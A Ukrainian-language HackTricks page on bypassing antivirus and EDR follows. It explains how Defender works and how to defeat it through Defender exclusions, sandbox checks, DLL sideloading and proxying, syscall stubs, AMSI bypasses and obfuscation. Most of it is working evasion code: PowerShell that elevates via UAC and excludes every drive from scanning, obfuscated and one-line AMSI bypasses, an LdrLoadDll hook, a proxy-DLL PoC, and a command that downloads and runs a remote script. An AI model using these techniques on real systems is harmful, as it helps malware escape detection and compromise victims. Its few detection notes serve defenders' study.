# Обхід антивіруса (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинка Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender із видаванням себе за інший AV.
- [Вимкнення Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка UAC у стилі інсталятора перед втручанням у Defender

Public loaders, що маскуються під game cheats, часто постачаються як unsigned Node.js/Nexe installers, які спочатку **запитують у користувача підвищення привілеїв**, а лише потім нейтралізують Defender. Процес простий:

1. Перевірити адміністративний контекст за допомогою `net session`. Команда успішна лише тоді, коли викликач має права адміністратора, тому помилка означає, що loader запущено від імені standard user.
2. Негайно повторно запустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит підтвердження UAC, зберігаючи оригінальний command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що встановлюють «cracked» software, тому запит зазвичай приймають, надаючи malware права, необхідні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Загальні виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader максимізують сліпі зони Defender, замість того щоб повністю вимикати службу. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які кожен профіль користувача, системний каталог і знімний диск стає недоступним для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл проходить кожну змонтовану файлову систему (D:\, E:\, USB-накопичувачі тощо), тому **будь-який майбутній payload, розміщений у будь-якому місці на диску, ігноруватиметься**.
- Виключення розширення `.sys` розраховане на майбутнє — attackers залишають за собою можливість пізніше завантажувати unsigned drivers, не взаємодіючи з Defender повторно.
- Усі зміни вносяться до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу наступним етапам підтвердити збереження виключень або розширити їх без повторного запуску UAC.

Оскільки жодна служба Defender не зупиняється, наївні перевірки стану продовжують повідомляти “antivirus active”, хоча перевірка в реальному часі фактично не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Наразі AV використовують різні методи для перевірки того, чи є файл malicious: static detection, dynamic analysis, а для більш просунутих EDR — behavioural analysis.

### **Static detection**

Static detection досягається виявленням відомих malicious strings або масивів байтів у binary чи script, а також вилученням інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, digital signatures, іконки, checksum тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували та позначили як malicious. Є кілька способів обійти такий тип detection:

- **Encryption**

Якщо зашифрувати binary, AV не зможе виявити вашу програму, але вам знадобиться певний loader, щоб розшифрувати та запустити програму в memory.

- **Obfuscation**

Іноді достатньо змінити деякі strings у binary або script, щоб пройти повз AV, але залежно від того, що саме ви намагаєтеся obfuscate, це може бути тривалим завданням.

- **Custom tooling**

Якщо ви розробляєте власні tools, відомих bad signatures не буде, але це потребує багато часу та зусиль.

> [!TIP]
> Хорошим способом перевірити static detection у Windows Defender є [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розділяє файл на кілька сегментів, а потім доручає Defender сканувати кожен із них окремо. Таким чином, він може точно показати, які strings або bytes у вашому binary були позначені.

Наполегливо рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і стежить за malicious activity (наприклад, спробами розшифрувати та прочитати passwords із browser, виконанням minidump для LSASS тощо). Із цією частиною може бути дещо складніше працювати, але ось кілька способів ухилятися від sandbox:

- **Sleep before execution** Залежно від реалізації це може бути чудовим способом обійти dynamic analysis AV. AV має дуже мало часу на сканування файлів, щоб не переривати робочий процес користувача, тому тривалий sleep може завадити аналізу binaries. Проблема в тому, що багато AV sandbox можуть просто пропустити sleep — залежно від способу його реалізації.
- **Checking machine's resources** Зазвичай Sandboxes мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б уповільнювати машину користувача. Тут також можна проявити креативність: наприклад, перевіряти температуру CPU або навіть швидкість обертання вентиляторів — у sandbox може бути реалізовано не все.
- **Machine-specific checks** Якщо ви хочете націлитися на користувача, чия workstation приєднана до домену "contoso.local", можна перевірити domain комп’ютера й визначити, чи збігається він із вказаним. Якщо ні, можна завершити роботу програми.

Виявилося, що computername у Microsoft Defender's Sandbox — HAL9TH. Тому перед detonation можна перевірити ім’я комп’ютера у вашому malware: якщо ім’я збігається з HAL9TH, це означає, що ви перебуваєте всередині defender's sandbox, тож програма може завершити роботу.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ось ще кілька справді корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже зазначали раніше в цьому post, **public tools** зрештою **будуть виявлені**, тож варто поставити собі запитання:

Наприклад, якщо ви хочете зробити dump LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна використати інший project, який менш відомий і також робить dump LSASS?

Правильна відповідь, імовірно, друга. Якщо взяти mimikatz як приклад, це, мабуть, один із найбільш, якщо не найбільш flagged pieces of malware для AV та EDR. Хоча сам project дуже крутий, працювати з ним для обходу AV — справжній кошмар, тому просто шукайте alternatives для досягнення потрібного результату.

> [!TIP]
> Під час модифікації payloads для evasion обов’язково **вимкніть automatic sample submission** у defender і, будь ласка, серйозно: **НЕ ЗАВАНТАЖУЙТЕ ЇХ У VIRUSTOTAL**, якщо ваша мета — довгострокове досягнення evasion. Якщо ви хочете перевірити, чи виявляє ваш payload певний AV, встановіть його на VM, спробуйте вимкнути automatic sample submission і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте пріоритет використанню DLL для evasion**. З мого досвіду, DLL files зазвичай **виявляються та аналізуються набагато рідше**, тому в деяких випадках це дуже простий trick для уникнення detection (якщо ваш payload, звісно, можна запускати як DLL).

Як видно на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька tricks, які можна використовувати з DLL files, щоб зробити їх набагато stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи victim application і malicious payload(s) поруч один з одним.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та наведеного нижче powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, уразливих до DLL hijacking, у `"C:\Program Files\\"`, а також DLL-файли, які вони намагаються завантажити.

Я наполегливо рекомендую **самостійно досліджувати програми, придатні для DLL Hijacking/Sideloading**. За належного виконання ця техніка є досить прихованою, але якщо ви використовуєте загальновідомі програми, придатні для DLL Sideloading, вас можуть легко виявити.

Просте розміщення шкідливої DLL з іменем, яке програма очікує завантажити, не запустить ваш payload, оскільки програма очікує наявності в цій DLL певних функцій. Щоб виправити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики, які програма виконує до proxy (і шкідливої) DLL, до оригінальної DLL, зберігаючи функціональність програми та забезпечуючи виконання вашого payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, яких я дотримувався:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда створить 2 файли: шаблон вихідного коду DLL та оригінальну DLL із новою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають Detection rate 0/26 на [antiscan.me](https://antiscan.me)! Це можна вважати успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **настійно рекомендую** переглянути [twitch VOD S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про розглянуті нами теми.

### Зловживання Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є "forwarders": замість вказівника на code запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли caller resolve-ить export, Windows loader:

- Завантажує `TargetDll`, якщо його ще не завантажено
- Resolve-ить `TargetFunc` із нього

Основні особливості, які потрібно розуміти:
- Якщо `TargetDll` є KnownDLL, він надається із захищеного namespace KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує forward resolution.

Це створює примітив для непрямого sideloading: потрібно знайти підписану DLL, яка експортує функцію, перенаправлену до імені модуля, що не є KnownDLL, а потім розмістити цю підписану DLL в одній директорії з DLL під контролем attacker-а, названою точно так само, як forwarded target module. Коли викликається forwarded export, loader виконує resolve forward і завантажує вашу DLL з тієї самої директорії, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, спостережений у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він знаходиться за допомогою звичайного порядку пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL у папку, доступну для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Розмістіть шкідливий `NCRYPTPROV.dll` у тій самій папці. Для виконання коду достатньо мінімальної DllMain; реалізовувати перенаправлену функцію не потрібно, щоб запустити DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Запустіть пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв’язання `KeyIsoSetAuditingInterface` loader переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" виникне лише після того, як `DllMain` уже буде виконано

Поради з пошуку:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар forwarder у Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із несистемних шляхів, а потім завантажують non-KnownDLLs з такою самою базовою назвою з цього каталогу
- Створюйте сповіщення для ланцюжків процесів/модулів на кшталт: `rundll32.exe` → несистемний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики code integrity (WDAC/AppLocker) і забороняйте write+execute у каталогах застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це payload toolkit для bypassing EDR за допомогою призупинених процесів, direct syscalls та альтернативних методів виконання`

Ви можете використовувати Freeze для непомітного завантаження та виконання свого shellcode.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це просто гра в кішки-мишки: те, що працює сьогодні, завтра може бути виявлено, тому ніколи не покладайтеся лише на один інструмент; якщо можливо, намагайтеся поєднувати кілька технік evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR часто встановлюють **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна генерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додає інструкцію `syscall`/`sysenter`/`SVC #0` до згенерованого stub (без звернення до export у `ntdll`).
- **Indirect**: переходить до наявного `syscall` gadget усередині `ntdll`, щоб перехід до kernel mode виглядав так, ніби він походить із `ntdll` (корисно для evasion евристик); **randomized indirect** вибирає gadget із пулу для кожного виклику.
- **Egg-hunt**: уникає вбудовування статичної opcode-послідовності `0F 05` на диску; визначає syscall sequence під час виконання.

**Стійкі до hooks стратегії визначення SSN:**
- **FreshyCalls (VA sort)**: визначає SSN, сортуючи syscall stubs за virtual address замість читання байтів stub.
- **SyscallsFromDisk**: відображає чистий `\KnownDlls\ntdll.dll`, зчитує SSN з його `.text`, а потім видаляє відображення (обходить усі in-memory hooks).
- **RecycledGate**: поєднує визначення SSN через VA sort із перевіркою opcode, коли stub є чистим; якщо встановлено hook, використовує визначення через VA.
- **HW Breakpoint**: встановлює DR0 на інструкцію `syscall` і використовує VEH для отримання SSN з `EAX` під час виконання, не аналізуючи hooked bytes.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якщо якимось чином виконати payload **безпосередньо в пам'яті**, AV не міг цьому запобігти, оскільки не мав достатньої видимості.

Функція AMSI інтегрована в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне оцінювання коду)
- Windows Script Host (wscript.exe та cscript.exe)
- JavaScript та VBScript
- Макроси Office VBA

Це дозволяє antivirus-рішенням перевіряти поведінку скриптів, надаючи вміст скриптів у незашифрованій і не обфускованій формі.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає префікс `amsi:`, а потім шлях до executable, з якого було запущено скрипт, у цьому випадку — powershell.exe

Ми не записували жодного файлу на диск, але все одно були виявлені в пам'яті завдяки AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також проходить через AMSI. Це навіть стосується `Assembly.Load(byte[])` для завантаження виконання в пам'ять. Саме тому для виконання в пам'яті рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче), якщо ви хочете обійти AMSI.

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно працює зі статичними виявленнями, модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI здатен деобфускувати скрипти, навіть якщо вони мають кілька шарів, тому obfuscation може бути невдалим варіантом залежно від способу її виконання. Через це обхід не є таким простим. Водночас інколи достатньо змінити кілька назв змінних — і все працюватиме, тож усе залежить від того, наскільки щось було позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), ним можна легко маніпулювати навіть без привілейованого користувача. Через цей недолік у реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Forcing an Error**

Примусова помилка ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу сканування не буде ініційовано. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру для запобігання ширшому використанню цього методу.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усього одного рядка powershell-коду було достатньо, щоб зробити AMSI непридатним для використання в поточному powershell-процесі. Звичайно, цей рядок було виявлено самим AMSI, тому для використання цієї техніки потрібна певна модифікація.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Цю техніку спочатку виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона передбачає пошук адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезапис її інструкціями для повернення коду E_INVALIDARG. Таким чином, результат фактичного сканування буде 0, що інтерпретується як чистий результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Також існує багато інших технік для обходу AMSI за допомогою powershell. Перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше про них.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний, незалежний від мови bypass полягає у встановленні user-mode hook на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитуваним модулем є `amsi.dll`. У результаті AMSI ніколи не завантажується, і в цьому процесі сканування не виконуються.<sup>[[23]](#references)</sup>

Опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює в PowerShell, WScript/CScript і custom loaders (з усім, що інакше завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникати довгих артефактів командного рядка.
- Використовується в loaders, запущених через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає signature завдяки рандомізованим user-defined functions, змінним, виразам із символів і застосуванню випадкового регістру до ключових слів PowerShell для уникнення signature.

**Видалення виявленої signature**

Ви можете використовувати такі інструменти, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену AMSI signature з пам’яті поточного процесу. Цей інструмент сканує пам’ять поточного процесу на наявність AMSI signature, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**AV/EDR products that використовують AMSI**

Список AV/EDR products, які використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell version 2**
Якщо ви використовуєте PowerShell version 2, AMSI не буде завантажено, тому ви зможете запускати свої скрипти без сканування AMSI. Це можна зробити так:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging — це функція, яка дає змогу записувати всі PowerShell-команди, виконані в системі. Це може бути корисно для аудиту та усунення несправностей, але також може бути **проблемою для атакувальників, які хочуть уникнути виявлення**.

Щоб обійти PowerShell logging, можна використовувати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: для цього можна використати такий інструмент, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: якщо використовується PowerShell версії 2, AMSI не завантажується, тому скрипти можна запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: використовуйте [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (підхід, який використовує `powerpick` у Cobalt Strike). Це обходить засоби контролю, прив’язані саме до процесу `powershell.exe`, але не вимикає автоматично AMSI, Script Block Logging або всі інші засоби захисту PowerShell; охоплення залежить від runtime та реалізації host.


## Obfuscation

> [!TIP]
> Деякі техніки обфускації покладаються на шифрування даних, що підвищує ентропію binary і полегшує їх виявлення антивірусами та EDR. Будьте обережні та, можливо, застосовуйте шифрування лише до певних частин коду, які є чутливими або які потрібно приховати.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Під час аналізу malware, який використовує ConfuserEx 2 (або commercial forks), часто доводиться мати справу з кількома рівнями захисту, що блокують decompilers і sandboxes. Наведений нижче workflow надійно **відновлює майже оригінальний IL**, який після цього можна decompile у C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення anti-tampering — ConfuserEx шифрує кожне *method body* і розшифровує його всередині static constructor (`<Module>.cctor`) *module*. Він також змінює PE checksum, тому будь-яка модифікація призведе до аварійного завершення binary. Використовуйте **AntiTamperKiller**, щоб знайти зашифровані metadata tables, відновити XOR keys і перезаписати чисту assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними під час створення власного unpacker.

2.  Відновлення символів і control flow — передайте *clean* file до **de4dot-cex** (fork de4dot із підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Прапорці:
• `-p crx` — вибір профілю ConfuserEx 2
• de4dot скасує control-flow flattening, відновить оригінальні namespaces, classes і variable names та розшифрує constant strings.

3.  Видалення proxy calls — ConfuserEx замінює прямі method calls легкими wrappers (так званими *proxy calls*), щоб додатково ускладнити decompilation. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку замість непрозорих wrapper functions (`Class8.smethod_10`, …) мають відображатися звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`.

4.  Ручне очищення — запустіть отриманий binary у dnSpy, виконайте пошук великих Base64 blobs або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти справжній payload. Часто malware зберігає його як TLV-encoded byte array, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює execution flow **без необхідності запускати шкідливий sample** — це корисно під час роботи на offline workstation.

> 🛈  ConfuserEx створює custom attribute з назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork пакета компіляції [LLVM](http://www.llvm.org/), здатний забезпечити підвищену безпеку програмного забезпечення за допомогою [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і захисту від несанкціонованої модифікації.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації obfuscated code під час компіляції без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих за допомогою C++ template metaprogramming framework, що дещо ускладнює життя тому, хто намагається зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, здатний obfuscate різні PE-файли, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це fine-grained code obfuscation framework для мов, що підтримуються LLVM, який використовує ROP (return-oriented programming). ROPfuscator obfuscates програму на рівні assembly code, перетворюючи звичайні інструкції на ROP chains і руйнуючи наше природне уявлення про нормальний control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний конвертувати наявні EXE/DLL у shellcode, а потім завантажувати їх

## SmartScreen і MoTW

Можливо, ви вже бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації: рідко завантажувані застосунки активують SmartScreen, який попереджає кінцевого користувача та не дозволяє йому запустити файл (хоча файл усе ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з іменем Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, з якої його було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **trusted** signing certificate, **не активують SmartScreen**.

